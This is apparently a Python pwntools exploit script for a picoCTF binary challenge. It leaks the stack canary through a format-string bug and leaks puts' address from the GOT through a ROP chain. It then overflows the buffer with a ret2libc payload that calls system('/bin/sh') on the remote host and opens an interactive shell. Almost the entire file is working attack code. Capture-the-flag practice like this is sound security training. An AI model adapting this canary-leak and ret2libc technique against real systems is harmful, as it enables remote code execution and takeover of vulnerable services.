#!/usr/bin/python3
import pwn
import sys
binary = "./vuln"
pwn.context.binary = binary
pwn.context.encoding = "latin"
lib = pwn.ELF("./libs/libc6-i386_2.27-3ubuntu1.6_amd64.so")
elf = pwn.ELF("./vuln")

if "debug" in sys.argv:
    pwn.context.log_level = "debug"

padding = 528 
padding_canary = 512
remote_guess = -3727

def leak_stack_row(io, i):
    io.sendline(str(remote_guess))
    io.sendline(f"%{i}$lx")
    io.recvuntil("Congrats: ")
    result = io.recvline().decode()
    return result 

def leak_canary(io):
    # printf, canary
    return leak_stack_row(io, 135)

def leak_puts(io):
    result = leak_canary(io)
    canary = result
    print(f"Canary = {canary}")
    payload = pwn.flat(
        b"A"*padding_canary,
        pwn.pack(int(canary, 16)),
        b"A"*(padding-padding_canary-4),
        pwn.pack(elf.plt["puts"]),
        pwn.pack(elf.symbols["main"]),
        pwn.pack(elf.got["puts"])
    )
    io.sendline(str(remote_guess))
    io.sendline(payload)
    for x in range(7):
        io.recvline()
    leak = io.recv(4)
    leak = pwn.u32(leak)
    return leak

def exploit():
    with pwn.remote("jupiter.challenges.picoctf.org", 43578) as io:
        puts = leak_puts(io)
        result = leak_canary(io)
        canary = result
        print(f"Canary = {canary}")
        print(f"Puts = {hex( puts )}")
        libc_base = puts - lib.symbols["puts"] 
        binsh = libc_base + next(lib.search(b"/bin/sh")) 
        system = libc_base + lib.symbols["system"] 
        payload = pwn.flat(
            b"A"*padding_canary,
            pwn.pack(int(canary,16)),
            b"A"*(padding-padding_canary-4),
            pwn.pack(system),
            pwn.pack(0x0),
            pwn.pack(binsh)
        )
        io.sendline(str(remote_guess))
        io.sendline(payload)
        io.interactive()

def main():
    if "exploit" in sys.argv:
        exploit()

if __name__ == "__main__":
    main()
